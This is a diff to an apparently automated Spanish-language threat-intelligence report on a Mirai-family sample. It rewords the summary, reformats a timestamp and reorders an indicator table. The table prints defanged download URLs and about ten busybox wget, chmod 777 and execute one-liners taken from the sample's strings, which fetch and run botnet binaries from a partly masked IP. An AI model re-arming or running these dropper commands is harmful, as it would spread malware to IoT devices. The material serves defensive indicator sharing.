@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se asociaron 10 comandos observados o extraídos.
+Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se identificaron 10 comandos observados o extraídos. Se identificaron 21 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:00:23+00:00`
+- **Registrado:** `2026-08-09T20:00:23.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -63,18 +64,17 @@ busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vciman
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 141.11.88.XXX | static_analysis |
-| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm; | strings |
-| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm5; | strings |
-| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm6; | strings |
 | url | hxxp://141.11.88.XXX/bins/vcimanagement.arm7; | strings |
-| url | hxxp://141.11.88.XXX/bins/vcimanagement.m68k; | strings |
-| url | hxxp://141.11.88.XXX/bins/vcimanagement.mips; | strings |
-| url | hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; | strings |
 | url | hxxp://141.11.88.XXX/bins/vcimanagement.ppc; | strings |
 | url | hxxp://141.11.88.XXX/bins/vcimanagement.sh4; | strings |
+| url | hxxp://141.11.88.XXX/bins/vcimanagement.m68k; | strings |
+| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm6; | strings |
+| url | hxxp://141.11.88.XXX/bins/vcimanagement.mips; | strings |
+| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm5; | strings |
 | url | hxxp://141.11.88.XXX/bins/vcimanagement.spc; | strings |
-| hash | 520891dcfb7fb57f823cbf033142f6b679ccdf611cb7a8b9a42c0e260ab1c6dc | static_analysis |
+| url | hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; | strings |
+| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm; | strings |
+| ip | 141.11.88.XXX | static_analysis |
 | command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android | strings |
 | command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android | strings |
 | command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android | strings |
@@ -85,6 +85,7 @@ busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vciman
 | command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android | strings |
 | command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android | strings |
 | command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vciman | strings |
+| hash | 520891dcfb7fb57f823cbf033142f6b679ccdf611cb7a8b9a42c0e260ab1c6dc | static_analysis |
 
 ## 🔎 Triage
 
